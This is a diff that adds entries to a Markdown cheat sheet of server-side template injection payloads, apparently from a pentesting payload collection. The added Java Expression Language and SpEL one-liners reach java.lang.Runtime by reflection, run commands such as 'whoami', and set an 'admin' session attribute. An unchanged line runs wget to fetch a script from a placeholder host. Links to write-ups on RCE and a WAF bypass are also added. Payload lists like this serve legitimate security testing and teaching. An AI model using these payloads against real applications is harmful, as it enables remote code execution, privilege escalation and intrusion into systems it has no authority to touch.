@@ -145,8 +145,23 @@ ${{<%[%'"}}%\.
 ### Expression Language EL - Basic injection
 
 ```java
+${<property>}
 ${1+1}
+
+#{<expression string>}
 #{1+1}
+
+T(<javaclass>)
+```
+
+### Expression Language EL - Properties
+
+* Interesting properties to access `String`, `java.lang.Runtime`
+
+```ps1
+${2.class}
+${2.class.forName("java.lang.String")}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}
 ```
 
 ### Expression Language EL - One-Liner injections not including code execution
@@ -157,6 +172,9 @@ ${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClas
 
 // JVM System Property Lookup (ex: java.class.path)
 ${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
+
+// Modify session attributes
+${pageContext.request.getSession().setAttribute("admin",true)}
 ```
 
 ### Expression Language EL - Code Execution
@@ -181,9 +199,13 @@ ${request.getAttribute("a")}
 
 // Method using Reflection & Invoke
 ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
 
 // Method using ScriptEngineManager one-liner
 ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+
+// Method using JavaClass
+T(java.lang.Runtime).getRuntime().exec('whoami').x
 
 // Method using ScriptEngineManager
 ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
@@ -1132,3 +1154,6 @@ layout template:
 * [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
 * [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
 * [#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
+* [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
+* [Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+* [Expression Language Injection - OWASP](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
